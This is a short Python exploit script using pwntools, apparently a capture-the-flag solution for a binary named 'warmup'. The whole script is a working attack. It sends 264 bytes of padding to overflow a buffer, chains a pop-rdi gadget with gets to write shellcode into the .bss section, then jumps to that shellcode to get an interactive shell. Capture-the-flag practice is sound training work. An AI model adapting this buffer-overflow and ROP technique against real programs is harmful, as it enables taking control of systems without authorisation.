from pwn import *

context.arch = 'amd64'
pop_rdi = 0x0000000000400773
gets = 0x400580
elf = ELF("./warmup")
bss = elf.bss()
sh = asm(shellcraft.amd64.linux.sh())

payload = flat(['A'*264,p64(pop_rdi),p64(bss),p64(gets),p64(bss)])
s = process("./warmup")
s.sendline(payload)
s.sendline(sh)
s.interactive()
